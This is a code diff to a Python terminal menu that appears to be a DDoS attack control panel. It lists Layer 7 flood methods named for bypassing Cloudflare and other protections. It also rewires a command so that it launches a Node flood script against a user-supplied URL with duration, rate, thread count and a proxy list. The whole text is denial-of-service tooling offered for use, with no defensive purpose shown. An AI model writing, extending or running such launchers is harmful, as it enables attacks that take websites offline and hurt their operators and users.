@@ -182,13 +182,13 @@ def layer7():
                               \x1b[38;2;0;212;14m╔═══════════════╗
                               \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mLayer 7    \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗
-               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mgoat-bypass         \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcloudflare-uam    \x1b[38;2;0;212;14m║
-               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-fuzz           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mnormal-bypass     \x1b[38;2;0;212;14m║
-               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-dstat          \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcf-bypass         \x1b[38;2;0;212;14m║
-               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mautobypass          \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttps-bypass      \x1b[38;2;0;212;14m║
-               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-rand           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m100up-bypass      \x1b[38;2;0;212;14m║
-               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-raw            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-flood        \x1b[38;2;0;212;14m║
-               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-overflow       \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-get          \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttps               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcoming soon       \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcoming soon         \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcoming soon       \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcoming soon         \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcoming soon       \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcoming soon         \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcoming soon       \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcoming soon         \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcoming soon       \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcoming soon         \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcoming soon       \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcoming soon         \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcoming soon       \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝
 ''')
 
@@ -257,14 +257,16 @@ def main():
         elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
             tools()
         
-        elif "normal-bypass" in cnc:
+        elif "https" in cnc:
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
-                os.system(f'node httpbypassv2.js {url} {time}')
+                rate = cnc.split()[3]
+                thread = cnc.split()[4]
+                os.system(f'node tlsx.js {url} {time} {rate} {thread} proxy.txt')
             except IndexError:
-                print('Usage: normal-bypass <url> <time>')
-                print('Example: normal-bypass http://example.com 20')
+                print('Usage: https <url> <time> <rate> <thread>')
+                print('Example: https http://example.com 60 32 10')
 
         elif "cf-bypass" in cnc:
             try:
